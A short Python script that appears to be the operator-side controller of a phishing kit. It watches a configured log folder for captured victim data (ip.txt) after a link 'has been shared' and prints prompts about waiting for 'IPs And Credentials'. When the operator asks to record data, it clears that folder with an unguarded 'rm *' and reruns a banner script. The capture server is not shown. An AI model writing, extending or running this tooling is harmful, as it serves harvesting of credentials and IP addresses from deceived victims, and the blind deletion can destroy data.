#!/usr/bin/python3 
import os as console
import subprocess as system
import sys
from configparser import ConfigParser 
from colorama import Fore, Back, Style


Config = {}

class main_control:
    def initialize(require):
        global Config
        if console.path.isfile(require):
            Config = ConfigParser()
            Config.read(require)
            Config["include"] = { 
                'log' : Config.get('require','log'),
                'banner' : Config.get('require','banner')
            }
            return True

    initialize(console.path.join(console.path.dirname(console.path.realpath(__file__))) + "/.config.cfg")

def record_banner():
    PATH = Config["include"]["banner"]
    console.system("clear")
    system.run(["python3", PATH])
    print(Fore.GREEN + "[*] Waiting IPs And Credentials open the link," + Fore.WHITE +" Press Cntrl + C To Exit .. " + Style.RESET_ALL)
    pass

def quickstart():
    PATH = Config["include"]["banner"]
    console.system("clear")
    system.run(["python3", PATH])
    pass

def check_result():
    try:
        log = Config["include"]["log"]
        f = True
        while f:
            if console.path.isfile(log + "/ip.txt"):
                intr = input(Fore.GREEN + "[*] Your link has Been Shared! , Record Data ? Y/N : " + Style.RESET_ALL).lower()
                if intr == 'y':
                    console.chdir(log)
                    console.system("rm *")
                    record_banner()
                    f = False
                else:
                    quickstart()
                    f = False # Get Information 
                    pass
            pass
    except KeyboardInterrupt:
        console.system("clear")

if __name__ == "__main__":
    main_control() # configuration
    check_result() # check activity user 
    pass
